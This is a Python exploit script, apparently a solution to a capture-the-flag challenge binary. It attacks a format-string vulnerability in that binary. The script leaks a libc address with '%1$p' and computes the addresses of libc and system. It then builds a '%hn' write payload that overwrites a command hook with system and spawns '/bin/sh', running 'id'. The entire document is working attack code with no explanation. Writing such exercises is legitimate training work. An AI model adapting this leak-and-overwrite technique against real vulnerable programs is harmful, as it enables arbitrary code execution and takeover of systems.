#!/usr/bin/env python3
import re
import subprocess
import time

BIN = './chall'
LIBC = './libc.so.6'

def symoff(name: str) -> int:
    out = subprocess.check_output(['readelf', '-sW', LIBC], text=True)
    for line in out.splitlines():
        if f' {name}@@' in line or f' {name}@' in line:
            cols = line.split()
            return int(cols[1], 16)
    raise RuntimeError(f'symbol not found: {name}')

p = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

def ru(token: bytes) -> bytes:
    data = b''
    while token not in data:
        c = p.stdout.read(1)
        if not c:
            raise EOFError(data.decode('latin1', 'ignore'))
        data += c
    return data

def sl(x):
    if isinstance(x, str):
        x = x.encode()
    p.stdin.write(x + b'\n')
    p.stdin.flush()

def send_fmt(payload: str) -> bytes:
    ru(b'> ')
    sl('1')
    ru(b'format: ')
    sl(payload)
    out = ru(b'\n1. format')
    return out[:-len(b'\n1. format')]

puts_off = symoff('puts')
system_off = symoff('system')

leak_out = send_fmt('%1$p')
leaked_puts = int(re.search(rb'0x[0-9a-f]+', leak_out).group(0), 16)
libc_base = leaked_puts - puts_off
system = libc_base + system_off

print(f'[+] puts leak   = {leaked_puts:#x}')
print(f'[+] libc base   = {libc_base:#x}')
print(f'[+] system      = {system:#x}')

# command_hook is available as printf argument 2..5:
# %2$hn -> hook+0, %3$hn -> hook+2, %4$hn -> hook+4, %5$hn -> hook+6
halfwords = [(system >> (16 * i)) & 0xffff for i in range(4)]
items = sorted((value, 2 + i) for i, value in enumerate(halfwords))

payload = ''
printed = 0
for value, arg_index in items:
    inc = (value - printed) & 0xffff
    if inc:
        # %8$Nc uses the zero padding argument at position 8 and prints N chars.
        payload += f'%8${inc}c'
        printed = (printed + inc) & 0xffff
    payload += f'%{arg_index}$hn'

print(f'[+] payload length = {len(payload)}')
send_fmt(payload)

ru(b'> ')
sl('2')
ru(b'arg: ')
sl('/bin/sh')
sl('id')
sl('exit')
time.sleep(0.2)
p.kill()
print(p.stdout.read(4096).decode('latin1', 'ignore'))
